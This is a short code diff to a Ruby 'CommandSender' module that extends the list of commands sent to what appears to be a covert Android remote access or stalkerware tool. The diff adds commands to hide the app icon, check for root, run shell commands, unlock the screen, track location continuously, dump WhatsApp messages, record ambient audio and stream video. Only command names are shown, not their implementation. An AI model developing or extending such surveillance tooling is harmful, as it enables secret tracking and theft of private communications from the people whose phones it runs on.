@@ -20,8 +20,13 @@ module CommandSender
     send_sms get_sms get_device_info start_camera stop_camera
     get_wifi_info get_localtime uninstall_app install_apk
     launch_app get_installed_apps get_contacts take_picture
-    screen_record get_location get_call_logs get_browser_history
-    toggle_wifi set_audio_mode get_notifications
+    take_photo take_screenshot screen_record get_location
+    get_call_logs get_browser_history toggle_wifi set_audio_mode
+    get_notifications get_accounts get_app_usage
+    shell_exec check_root hide_icon show_icon unlock_screen
+    start_continuous_location dump_whatsapp_messages
+    start_audio stop_audio start_screen_record stop_screen_record
+    ambient_record browse_files start_webrtc_stream
     list_files download_file upload_file delete_file preview_file
     rename_file move_file search_files upload_file_chunk
   ].freeze
